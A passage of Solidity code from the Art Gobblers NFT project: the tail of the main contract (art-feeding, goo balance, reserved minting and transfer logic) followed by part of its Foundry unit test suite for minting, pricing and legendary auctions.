minted.\n    /// @param gobblerId The id of the token to get the URI for.\n    function tokenURI(uint256 gobblerId) public view virtual override returns (string memory) {\n        // Between 0 and lastRevealed are revealed normal gobblers.\n        if (gobblerId <= gobblerRevealsData.lastRevealedId) {\n            if (gobblerId == 0) revert(\"NOT_MINTED\"); // 0 is not a valid id for Art Gobblers.\n\n            return string.concat(BASE_URI, uint256(getGobblerData[gobblerId].idx).toString());\n        }\n\n        // Between lastRevealed + 1 and currentNonLegendaryId are minted but not revealed.\n        if (gobblerId <= currentNonLegendaryId) return UNREVEALED_URI;\n\n        // Between currentNonLegendaryId and FIRST_LEGENDARY_GOBBLER_ID are unminted.\n        if (gobblerId < FIRST_LEGENDARY_GOBBLER_ID) revert(\"NOT_MINTED\");\n\n        // Between FIRST_LEGENDARY_GOBBLER_ID and FIRST_LEGENDARY_GOBBLER_ID + numSold are minted legendaries.\n        if (gobblerId < FIRST_LEGENDARY_GOBBLER_ID + legendaryGobblerAuctionData.numSold)\n            return string.concat(BASE_URI, gobblerId.toString());\n\n        revert(\"NOT_MINTED\"); // Unminted legendaries and invalid token ids.\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                            GOBBLE ART LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Feed a gobbler a work of art.\n    /// @param gobblerId The gobbler to feed the work of art.\n    /// @param nft The ERC721 or ERC1155 contract of the work of art.\n    /// @param id The id of the work of art.\n    /// @param isERC1155 Whether the work of art is an ERC1155 token.\n    function gobble(\n        uint256 gobblerId,\n        address nft,\n        uint256 id,\n        bool isERC1155\n    ) external {\n        // Get the owner of the gobbler to feed.\n        address owner = getGobblerData[gobblerId].owner;\n\n        // The caller must own the gobbler they're feeding.\n        if (owner != msg.sender) revert OwnerMismatch(owner);\n\n        // Gobblers have taken a vow not to eat other gobblers.\n        if (nft == address(this)) revert Cannibalism();\n\n        unchecked {\n            // Increment the # of copies gobbled by the gobbler. Unchecked is\n            // safe, as an NFT can't have more than type(uint256).max copies.\n            ++getCopiesOfArtGobbledByGobbler[gobblerId][nft][id];\n        }\n\n        emit ArtGobbled(msg.sender, gobblerId, nft, id);\n\n        isERC1155\n            ? ERC1155(nft).safeTransferFrom(msg.sender, address(this), id, 1, \"\")\n            : ERC721(nft).transferFrom(msg.sender, address(this), id);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                                GOO LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Calculate a user's virtual goo balance.\n    /// @param user The user to query balance for.\n    function gooBalance(address user) public view returns (uint256) {\n        // Compute the user's virtual goo balance by leveraging LibGOO.\n        // prettier-ignore\n        return LibGOO.computeGOOBalance(\n            getUserData[user].emissionMultiple,\n            getUserData[user].lastBalance,\n            uint(toDaysWadUnsafe(block.timestamp - getUserData[user].lastTimestamp))\n        );\n    }\n\n    /// @notice Add goo to your emission balance,\n    /// burning the corresponding ERC20 balance.\n    /// @param gooAmount The amount of goo to add.\n    function addGoo(uint256 gooAmount) external {\n        // Burn goo being added to gobbler.\n        goo.burnForGobblers(msg.sender, gooAmount);\n\n        // Increase msg.sender's virtual goo balance.\n        updateUserGooBalance(msg.sender, gooAmount, GooBalanceUpdateType.INCREASE);\n    }\n\n    /// @notice Remove goo from your emission balance, and\n    /// add the corresponding amount to your ERC20 balance.\n    /// @param gooAmount The amount of goo to remove.\n    function removeGoo(uint256 gooAmount) external {\n        // Decrease msg.sender's virtual goo balance.\n        updateUserGooBalance(msg.sender, gooAmount, GooBalanceUpdateType.DECREASE);\n\n        // Mint the corresponding amount of ERC20 goo.\n        goo.mintForGobblers(msg.sender, gooAmount);\n    }\n\n    /// @notice Burn an amount of a user's virtual goo balance. Only callable\n    /// by the Pages contract to enable purchasing pages with virtual balance.\n    /// @param user The user whose virtual goo balance we should burn from.\n    /// @param gooAmount The amount of goo to burn from the user's virtual balance.\n    function burnGooForPages(address user, uint256 gooAmount) external {\n        // The caller must be the Pages contract, revert otherwise.\n        if (msg.sender != address(pages)) revert UnauthorizedCaller(msg.sender);\n\n        // Burn the requested amount of goo from the user's virtual goo balance.\n        // Will revert if the user doesn't have enough goo in their virtual balance.\n        updateUserGooBalance(user, gooAmount, GooBalanceUpdateType.DECREASE);\n    }\n\n    /// @dev An enum for representing whether to\n    /// increase or decrease a user's goo balance.\n    enum GooBalanceUpdateType {\n        INCREASE,\n        DECREASE\n    }\n\n    /// @notice Update a user's virtual goo balance.\n    /// @param user The user whose virtual goo balance we should update.\n    /// @param gooAmount The amount of goo to update the user's virtual balance by.\n    /// @param updateType Whether to increase or decrease the user's balance by gooAmount.\n    function updateUserGooBalance(\n        address user,\n        uint256 gooAmount,\n        GooBalanceUpdateType updateType\n    ) internal {\n        // Will revert due to underflow if we're decreasing by more than the user's current balance.\n        // Don't need to do checked addition in the increase case, but we do it anyway for convenience.\n        uint256 updatedBalance = updateType == GooBalanceUpdateType.INCREASE\n            ? gooBalance(user) + gooAmount\n            : gooBalance(user) - gooAmount;\n\n        // Snapshot the user's new goo balance with the current timestamp.\n        getUserData[user].lastBalance = uint128(updatedBalance);\n        getUserData[user].lastTimestamp = uint64(block.timestamp);\n\n        emit GooBalanceUpdated(user, updatedBalance);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                     RESERVED GOBBLERS MINTING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Mint a number of gobblers to the reserves.\n    /// @param numGobblersEach The number of gobblers to mint to each reserve.\n    /// @dev Gobblers minted to reserves cannot comprise more than 20% of the sum of\n    /// the supply of goo minted gobblers and the supply of gobblers minted to reserves.\n    function mintReservedGobblers(uint256 numGobblersEach) external returns (uint256 lastMintedGobblerId) {\n        unchecked {\n            // Optimistically increment numMintedForReserves, may be reverted below. Overflow in this\n            // calculation is possible but numGobblersEach would have to be so large that it would cause the\n            // loop in _batchMint to run out of gas quickly. Shift left by 1 is equivalent to multiplying by 2.\n            uint256 newNumMintedForReserves = numMintedForReserves += (numGobblersEach << 1);\n\n            // Ensure that after this mint gobblers minted to reserves won't comprise more than 20% of\n            // the sum of the supply of goo minted gobblers and the supply of gobblers minted to reserves.\n            if (newNumMintedForReserves > (numMintedFromGoo + newNumMintedForReserves) / 5) revert ReserveImbalance();\n        }\n\n        // Mint numGobblersEach gobblers to both the team and community reserve.\n        lastMintedGobblerId = _batchMint(team, numGobblersEach, currentNonLegendaryId);\n        lastMintedGobblerId = _batchMint(community, numGobblersEach, lastMintedGobblerId);\n\n        currentNonLegendaryId = uint128(lastMintedGobblerId); // Set currentNonLegendaryId.\n\n        emit ReservedGobblersMinted(msg.sender, lastMintedGobblerId, numGobblersEach);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                          CONVENIENCE FUNCTIONS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Convenience function to get emissionMultiple for a gobbler.\n    /// @param gobblerId The gobbler to get emissionMultiple for.\n    function getGobblerEmissionMultiple(uint256 gobblerId) external view returns (uint256) {\n        return getGobblerData[gobblerId].emissionMultiple;\n    }\n\n    /// @notice Convenience function to get emissionMultiple for a user.\n    /// @param user The user to get emissionMultiple for.\n    function getUserEmissionMultiple(address user) external view returns (uint256) {\n        return getUserData[user].emissionMultiple;\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              ERC721 LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 id\n    ) public override {\n        require(from == getGobblerData[id].owner, \"WRONG_FROM\");\n\n        require(to != address(0), \"INVALID_RECIPIENT\");\n\n        require(\n            msg.sender == from || isApprovedForAll[from][msg.sender] || msg.sender == getApproved[id],\n            \"NOT_AUTHORIZED\"\n        );\n\n        delete getApproved[id];\n\n        getGobblerData[id].owner = to;\n\n        unchecked {\n            uint32 emissionMultiple = getGobblerData[id].emissionMultiple; // Caching saves gas.\n\n            // We update their last balance before updating their emission multiple to avoid\n            // penalizing them by retroactively applying their new (lower) emission multiple.\n            getUserData[from].lastBalance = uint128(gooBalance(from));\n            getUserData[from].lastTimestamp = uint64(block.timestamp);\n            getUserData[from].emissionMultiple -= emissionMultiple;\n            getUserData[from].gobblersOwned -= 1;\n\n            // We update their last balance before updating their emission multiple to avoid\n            // overpaying them by retroactively applying their new (higher) emission multiple.\n            getUserData[to].lastBalance = uint128(gooBalance(to));\n            getUserData[to].lastTimestamp = uint64(block.timestamp);\n            getUserData[to].emissionMultiple += emissionMultiple;\n            getUserData[to].gobblersOwned += 1;\n        }\n\n        emit Transfer(from, to, id);\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity >=0.8.0;\n\nimport {DSTestPlus} from \"solmate/test/utils/DSTestPlus.sol\";\nimport {Utilities} from \"./utils/Utilities.sol\";\nimport {console} from \"./utils/Console.sol\";\nimport {Vm} from \"forge-std/Vm.sol\";\nimport {stdError} from \"forge-std/Test.sol\";\nimport {ArtGobblers, FixedPointMathLib} from \"../src/ArtGobblers.sol\";\nimport {Goo} from \"../src/Goo.sol\";\nimport {Pages} from \"../src/Pages.sol\";\nimport {GobblerReserve} from \"../src/utils/GobblerReserve.sol\";\nimport {RandProvider} from \"../src/utils/rand/RandProvider.sol\";\nimport {ChainlinkV1RandProvider} from \"../src/utils/rand/ChainlinkV1RandProvider.sol\";\nimport {LinkToken} from \"./utils/mocks/LinkToken.sol\";\nimport {VRFCoordinatorMock} from \"chainlink/v0.8/mocks/VRFCoordinatorMock.sol\";\nimport {ERC721} from \"solmate/tokens/ERC721.sol\";\nimport {MockERC1155} from \"solmate/test/utils/mocks/MockERC1155.sol\";\nimport {LibString} from \"solmate/utils/LibString.sol\";\nimport {fromDaysWadUnsafe} from \"solmate/utils/SignedWadMath.sol\";\n\n/// @notice Unit test for Art Gobbler Contract.\ncontract ArtGobblersTest is DSTestPlus {\n    using LibString for uint256;\n\n    Vm internal immutable vm = Vm(HEVM_ADDRESS);\n\n    Utilities internal utils;\n    address payable[] internal users;\n\n    ArtGobblers internal gobblers;\n    VRFCoordinatorMock internal vrfCoordinator;\n    LinkToken internal linkToken;\n    Goo internal goo;\n    Pages internal pages;\n    GobblerReserve internal team;\n    GobblerReserve internal community;\n    RandProvider internal randProvider;\n\n    bytes32 private keyHash;\n    uint256 private fee;\n\n    uint256[] ids;\n\n    /*//////////////////////////////////////////////////////////////\n                                  SETUP\n    //////////////////////////////////////////////////////////////*/\n\n    function setUp() public {\n        utils = new Utilities();\n        users = utils.createUsers(5);\n        linkToken = new LinkToken();\n        vrfCoordinator = new VRFCoordinatorMock(address(linkToken));\n\n        //gobblers contract will be deployed after 4 contract deploys, and pages after 5\n        address gobblerAddress = utils.predictContractAddress(address(this), 4);\n        address pagesAddress = utils.predictContractAddress(address(this), 5);\n\n        team = new GobblerReserve(ArtGobblers(gobblerAddress), address(this));\n        community = new GobblerReserve(ArtGobblers(gobblerAddress), address(this));\n        randProvider = new ChainlinkV1RandProvider(\n            ArtGobblers(gobblerAddress),\n            address(vrfCoordinator),\n            address(linkToken),\n            keyHash,\n            fee\n        );\n\n        goo = new Goo(\n            // Gobblers:\n            utils.predictContractAddress(address(this), 1),\n            // Pages:\n            utils.predictContractAddress(address(this), 2)\n        );\n\n        gobblers = new ArtGobblers(\n            keccak256(abi.encodePacked(users[0])),\n            block.timestamp,\n            goo,\n            Pages(pagesAddress),\n            address(team),\n            address(community),\n            randProvider,\n            \"base\",\n            \"\"\n        );\n\n        pages = new Pages(block.timestamp, goo, address(0xBEEF), gobblers, \"\");\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                               MINT TESTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Test that minting from the mintlist before minting starts fails.\n    function testMintFromMintlistBeforeMintingStarts() public {\n        vm.warp(block.timestamp - 1);\n\n        address user = users[0];\n        bytes32[] memory proof;\n        vm.prank(user);\n        vm.expectRevert(ArtGobblers.MintStartPending.selector);\n        gobblers.claimGobbler(proof);\n    }\n\n    /// @notice Test that you can mint from mintlist successfully.\n    function testMintFromMintlist() public {\n        address user = users[0];\n        bytes32[] memory proof;\n        vm.prank(user);\n        gobblers.claimGobbler(proof);\n        // verify gobbler ownership\n        assertEq(gobblers.ownerOf(1), user);\n        assertEq(gobblers.balanceOf(user), 1);\n    }\n\n    /// @notice Test that minting from the mintlist twice fails.\n    function testMintingFromMintlistTwiceFails() public {\n        address user = users[0];\n        bytes32[] memory proof;\n        vm.startPrank(user);\n        gobblers.claimGobbler(proof);\n\n        vm.expectRevert(ArtGobblers.AlreadyClaimed.selector);\n        gobblers.claimGobbler(proof);\n    }\n\n    /// @notice Test that an invalid mintlist proof reverts.\n    function testMintNotInMintlist() public {\n        bytes32[] memory proof;\n        vm.expectRevert(ArtGobblers.InvalidProof.selector);\n        gobblers.claimGobbler(proof);\n    }\n\n    /// @notice Test that you can successfully mint from goo.\n    function testMintFromGoo() public {\n        uint256 cost = gobblers.gobblerPrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], cost);\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, false);\n        assertEq(gobblers.ownerOf(1), users[0]);\n    }\n\n    /// @notice Test that trying to mint with insufficient balance reverts.\n    function testMintInsufficientBalance() public {\n        vm.prank(users[0]);\n        vm.expectRevert(stdError.arithmeticError);\n        gobblers.mintFromGoo(type(uint256).max, false);\n    }\n\n    /// @notice Test that you can successfully mint from goo.\n    function testMintFromGooBalance() public {\n        uint256 cost = gobblers.gobblerPrice();\n        //mint initial gobbler\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], cost);\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, false);\n        assertEq(gobblers.balanceOf(users[0]), 1);\n        //warp for reveals\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        //warp until balance is larger than cost\n        vm.warp(block.timestamp + 3 days);\n        uint256 initialBalance = gobblers.gooBalance(users[0]);\n        uint256 gobblerPrice = gobblers.gobblerPrice();\n        assertTrue(initialBalance > gobblerPrice);\n        console.log(\"newPrice\", gobblerPrice);\n        console.log(\"balance\", initialBalance);\n        //mint from balance\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, true);\n        //asert owner is correct\n        assertEq(gobblers.ownerOf(2), users[0]);\n        //asert balance went down by expected amount\n        uint256 finalBalance = gobblers.gooBalance(users[0]);\n        uint256 paidGoo = initialBalance - finalBalance;\n        assertEq(paidGoo, gobblerPrice);\n    }\n\n    /// @notice Test that you can't mint with insufficient balance\n    function testMintFromBalanceInsufficient() public {\n        vm.prank(users[0]);\n        vm.expectRevert(stdError.arithmeticError);\n        gobblers.mintFromGoo(type(uint256).max, true);\n    }\n\n    /// @notice Test that if mint price exceeds max it reverts.\n    function testMintPriceExceededMax() public {\n        uint256 cost = gobblers.gobblerPrice();\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], cost);\n        vm.prank(users[0]);\n        vm.expectRevert(abi.encodeWithSelector(ArtGobblers.PriceExceededMax.selector, cost));\n        gobblers.mintFromGoo(cost - 1, false);\n    }\n\n    /// @notice Test that initial gobbler price is what we expect.\n    function testInitialGobblerPrice() public {\n        // Warp to the target sale time so that the gobbler price equals the target price.\n        vm.warp(block.timestamp + fromDaysWadUnsafe(gobblers.getTargetSaleTime(1e18)));\n\n        uint256 cost = gobblers.gobblerPrice();\n        assertRelApproxEq(cost, uint256(gobblers.targetPrice()), 0.00001e18);\n    }\n\n    /// @notice Test that minting reserved gobblers fails if there are no mints.\n    function testMintReservedGobblersFailsWithNoMints() public {\n        vm.expectRevert(ArtGobblers.ReserveImbalance.selector);\n        gobblers.mintReservedGobblers(1);\n    }\n\n    /// @notice Test that reserved gobblers can be minted under fair circumstances.\n    function testCanMintReserved() public {\n        mintGobblerToAddress(users[0], 8);\n\n        gobblers.mintReservedGobblers(1);\n        assertEq(gobblers.ownerOf(9), address(team));\n        assertEq(gobblers.ownerOf(10), address(community));\n        assertEq(gobblers.balanceOf(address(team)), 1);\n        assertEq(gobblers.balanceOf(address(community)), 1);\n    }\n\n    /// @notice Test multiple reserved gobblers can be minted under fair circumstances.\n    function testCanMintMultipleReserved() public {\n        mintGobblerToAddress(users[0], 18);\n\n        gobblers.mintReservedGobblers(2);\n        assertEq(gobblers.ownerOf(19), address(team));\n        assertEq(gobblers.ownerOf(20), address(team));\n        assertEq(gobblers.ownerOf(21), address(community));\n        assertEq(gobblers.ownerOf(22), address(community));\n        assertEq(gobblers.balanceOf(address(team)), 2);\n        assertEq(gobblers.balanceOf(address(community)), 2);\n    }\n\n    /// @notice Test minting reserved gobblers fails if not enough have gobblers been minted.\n    function testCantMintTooFastReserved() public {\n        mintGobblerToAddress(users[0], 18);\n\n        vm.expectRevert(ArtGobblers.ReserveImbalance.selector);\n        gobblers.mintReservedGobblers(3);\n    }\n\n    /// @notice Test minting reserved gobblers fails one by one if not enough have gobblers been minted.\n    function testCantMintTooFastReservedOneByOne() public {\n        mintGobblerToAddress(users[0], 90);\n\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n        gobblers.mintReservedGobblers(1);\n\n        vm.expectRevert(ArtGobblers.ReserveImbalance.selector);\n        gobblers.mintReservedGobblers(1);\n    }\n\n    function testCanMintPageFromVirtualBalance() public {\n        uint256 cost = gobblers.gobblerPrice();\n        //mint initial gobbler\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], cost);\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, false);\n        //warp for reveals\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        //warp until balance is larger than cost\n        vm.warp(block.timestamp + 3 days);\n        uint256 initialBalance = gobblers.gooBalance(users[0]);\n        uint256 pagePrice = pages.pagePrice();\n        console.log(pagePrice);\n        assertTrue(initialBalance > pagePrice);\n        //mint from balance\n        vm.prank(users[0]);\n        pages.mintFromGoo(type(uint256).max, true);\n        //asert owner is correct\n        assertEq(pages.ownerOf(1), users[0]);\n        //asert balance went down by expected amount\n        uint256 finalBalance = gobblers.gooBalance(users[0]);\n        uint256 paidGoo = initialBalance - finalBalance;\n        assertEq(paidGoo, pagePrice);\n    }\n\n    function testCannotMintPageWithInsufficientBalance() public {\n        uint256 cost = gobblers.gobblerPrice();\n        //mint initial gobbler\n        vm.prank(address(gobblers));\n        goo.mintForGobblers(users[0], cost);\n        vm.prank(users[0]);\n        gobblers.mintFromGoo(type(uint256).max, false);\n        //warp for reveals\n        vm.warp(block.timestamp + 1 days);\n        setRandomnessAndReveal(1, \"seed\");\n        // try to mint from balance\n        vm.prank(users[0]);\n        vm.expectRevert(stdError.arithmeticError);\n        pages.mintFromGoo(type(uint256).max, true);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                              PRICING TESTS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Test VRGDA behavior when selling at target rate.\n    function testPricingBasic() public {\n        // VRGDA targets this number of mints at given time.\n        uint256 timeDelta = 120 days;\n        uint256 numMint = 876;\n\n        vm.warp(block.timestamp + timeDelta);\n\n        for (uint256 i = 0; i < numMint; i++) {\n            vm.startPrank(address(gobblers));\n            uint256 price = gobblers.gobblerPrice();\n            goo.mintForGobblers(users[0], price);\n            vm.stopPrank();\n            vm.prank(users[0]);\n            gobblers.mintFromGoo(price, false);\n        }\n\n        uint256 targetPrice = uint256(gobblers.targetPrice());\n        uint256 finalPrice = gobblers.gobblerPrice();\n\n        // Equal within 3 percent since num mint is rounded from true decimal amount.\n        assertRelApproxEq(finalPrice, targetPrice, 0.03e18);\n    }\n\n    /// @notice Pricing function should NOT revert when trying to price the last mintable gobbler.\n    function testDoesNotRevertEarly() public view {\n        // This is the last gobbler we expect to mint.\n        int256 maxMintable = int256(gobblers.MAX_MINTABLE()) * 1e18;\n        // This call should NOT revert, since we should have a target date for the last mintable gobbler.\n        gobblers.getTargetSaleTime(maxMintable);\n    }\n\n    /// @notice Pricing function should revert when trying to price beyond the last mintable gobbler.\n    function testDoesRevertWhenExpected() public {\n        // One plus the max number of mintable gobblers.\n        int256 maxMintablePlusOne = int256(gobblers.MAX_MINTABLE() + 1) * 1e18;\n        // This call should revert, since there should be no target date beyond max mintable gobblers.\n        vm.expectRevert(\"UNDEFINED\");\n        gobblers.getTargetSaleTime(maxMintablePlusOne);\n    }\n\n    /*//////////////////////////////////////////////////////////////\n                           LEGENDARY GOBBLERS\n    //////////////////////////////////////////////////////////////*/\n\n    /// @notice Test that attempting to mint before start time reverts.\n    function testLegendaryGobblerMintBeforeStart() public {\n        vm.expectRevert(\n            abi.encodeWithSelector(\n                ArtGobblers.LegendaryAuctionNotStarted.selector,\n                gobblers.LEGENDARY_AUCTION_INTERVAL()\n            )\n        );\n        vm.prank(users[0]);\n        gobblers.mintLegendaryGobbler(ids);\n    }\n\n    /// @notice Test that Legendary Gobbler initial price is what we expect.\n    function testLegendaryGobblerTargetPrice() public {\n        // Start of initial auction after initial interval is minted.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        // Initial auction should start at a cost of 69.\n        assertEq(cost, 69);\n    }\n\n    /// @notice Test that auction ends at a price of 0.\n    function testLegendaryGobblerFinalPrice() public {\n        // Mint 2 full intervals.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 2);\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        // Auction price should be 0 after full interval decay.\n        assertEq(cost, 0);\n    }\n\n    /// @notice Test that auction ends at a price of 0 even after the interval.\n    function testLegendaryGobblerPastFinalPrice() public {\n        // Mint 3 full intervals.\n        vm.warp(block.timestamp + 600 days);\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 3);\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        // Auction price should be 0 after full interval decay.\n        assertEq(cost, 0);\n    }\n\n    /// @notice Test that mid price happens when we expect.\n    function testLegendaryGobblerMidPrice() public {\n        // Mint first interval and half of second interval.\n        mintGobblerToAddress(users[0], FixedPointMathLib.unsafeDivUp(gobblers.LEGENDARY_AUCTION_INTERVAL() * 3, 2));\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        // Auction price should be cut by half mid way through auction.\n        assertEq(cost, 35);\n    }\n\n    /// @notice Test that target price does't fall below what we expect.\n    function testLegendaryGobblerMinStartPrice() public {\n        // Mint two full intervals, such that price of first auction goes to zero.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 2);\n        // Empty id list.\n        uint256[] memory _ids;\n        // Mint first auction at zero cost.\n        gobblers.mintLegendaryGobbler(_ids);\n        // Start cost of next auction, which should equal 69.\n        uint256 startCost = gobblers.legendaryGobblerPrice();\n        assertEq(startCost, 69);\n    }\n\n    /// @notice Test that Legendary Gobblers can be minted.\n    function testMintLegendaryGobbler() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n        // Mint full interval to kick off first auction.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 69);\n        setRandomnessAndReveal(cost, \"seed\");\n        uint256 emissionMultipleSum;\n        for (uint256 curId = 1; curId <= cost; curId++) {\n            ids.push(curId);\n            assertEq(gobblers.ownerOf(curId), users[0]);\n            emissionMultipleSum += gobblers.getGobblerEmissionMultiple(curId);\n        }\n\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), emissionMultipleSum);\n\n        vm.prank(users[0]);\n        uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n        // Legendary is owned by user.\n        assertEq(gobblers.ownerOf(mintedLegendaryId), users[0]);\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), emissionMultipleSum * 2);\n\n        assertEq(gobblers.getGobblerEmissionMultiple(mintedLegendaryId), emissionMultipleSum * 2);\n\n        for (uint256 i = 0; i < ids.length; i++) {\n            hevm.expectRevert(\"NOT_MINTED\");\n            gobblers.ownerOf(ids[i]);\n        }\n    }\n\n    /// @notice Test that Legendary Gobblers can be minted at 0 cost.\n    function testMintFreeLegendaryGobbler() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n\n        // Mint 2 full intervals to send price to zero.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 2);\n\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 0);\n\n        vm.prank(users[0]);\n        uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n        assertEq(gobblers.ownerOf(mintedLegendaryId), users[0]);\n        assertEq(gobblers.getGobblerEmissionMultiple(mintedLegendaryId), 0);\n    }\n\n    /// @notice Test that Legendary Gobblers can be minted at 0 cost.\n    function testMintFreeLegendaryGobblerPastInterval() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n\n        // Mint 3 full intervals to send price to zero.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL() * 3);\n\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 0);\n\n        vm.prank(users[0]);\n        uint256 mintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n\n        assertEq(gobblers.ownerOf(mintedLegendaryId), users[0]);\n        assertEq(gobblers.getGobblerEmissionMultiple(mintedLegendaryId), 0);\n    }\n\n    /// @notice Test that legendary gobblers can't be minted with insufficient payment.\n    function testMintLegendaryGobblerWithInsufficientCost() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n        // Mint full interval to kick off first auction.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 69);\n        setRandomnessAndReveal(cost, \"seed\");\n        uint256 emissionMultipleSum;\n        for (uint256 curId = 1; curId <= cost; curId++) {\n            ids.push(curId);\n            assertEq(gobblers.ownerOf(curId), users[0]);\n            emissionMultipleSum += gobblers.getGobblerEmissionMultiple(curId);\n        }\n\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), emissionMultipleSum);\n\n        //remove one id such that payment is insufficient\n        ids.pop();\n\n        vm.prank(users[0]);\n        vm.expectRevert(abi.encodeWithSelector(ArtGobblers.InsufficientGobblerAmount.selector, cost));\n        gobblers.mintLegendaryGobbler(ids);\n    }\n\n    /// @notice Test that legendary gobblers can be minted with slippage.\n    function testMintLegendaryGobblerWithSlippage() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n        // Mint full interval to kick off first auction.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 69);\n        setRandomnessAndReveal(cost, \"seed\");\n        uint256 emissionMultipleSum;\n        //add more ids than necessary\n        for (uint256 curId = 1; curId <= cost + 10; curId++) {\n            ids.push(curId);\n            assertEq(gobblers.ownerOf(curId), users[0]);\n            emissionMultipleSum += gobblers.getGobblerEmissionMultiple(curId);\n        }\n\n        vm.prank(users[0]);\n        gobblers.mintLegendaryGobbler(ids);\n\n        //check full cost was burned\n        for (uint256 curId = 1; curId <= cost; curId++) {\n            hevm.expectRevert(\"NOT_MINTED\");\n            gobblers.ownerOf(curId);\n        }\n        //check extra tokens were not burned\n        for (uint256 curId = cost + 1; curId <= cost + 10; curId++) {\n            assertEq(gobblers.ownerOf(curId), users[0]);\n        }\n    }\n\n    /// @notice Test that legendary gobblers can't be minted if the user doesn't own one of the ids.\n    function testMintLegendaryGobblerWithUnownedId() public {\n        uint256 startTime = block.timestamp + 30 days;\n        vm.warp(startTime);\n        // Mint full interval to kick off first auction.\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        uint256 cost = gobblers.legendaryGobblerPrice();\n        assertEq(cost, 69);\n        setRandomnessAndReveal(cost, \"seed\");\n        uint256 emissionMultipleSum;\n        for (uint256 curId = 1; curId <= cost; curId++) {\n            ids.push(curId);\n            assertEq(gobblers.ownerOf(curId), users[0]);\n            emissionMultipleSum += gobblers.getGobblerEmissionMultiple(curId);\n        }\n\n        assertEq(gobblers.getUserEmissionMultiple(users[0]), emissionMultipleSum);\n\n        ids.pop();\n        ids.push(999);\n\n        vm.prank(users[0]);\n        vm.expectRevert(\"WRONG_FROM\");\n        gobblers.mintLegendaryGobbler(ids);\n    }\n\n    /// @notice Test that legendary gobblers have expected ids.\n    function testMintLegendaryGobblersExpectedIds() public {\n        // We expect the first legendary to have this id.\n        uint256 nextMintLegendaryId = 9991;\n        mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n        for (int256 i = 0; i < 10; i++) {\n            vm.warp(block.timestamp + 400 days);\n\n            mintGobblerToAddress(users[0], gobblers.LEGENDARY_AUCTION_INTERVAL());\n            uint256 justMintedLegendaryId = gobblers.mintLegendaryGobbler(ids);\n            //assert that legendaries have the expected ids\n            assertEq(nextMintLegendaryId, justMintedLegendaryId);\n            nextMintLegendaryId++;\n        }\n\n        // Minting any more should fail.\n        vm.expectRevert(ArtGobblers.NoRemainingLegendaryGobblers.selector);\n        gobblers.mintLegendaryGobbler(ids);\n    }\n\n    /// @notice Test that Legendary Gobblers can't be 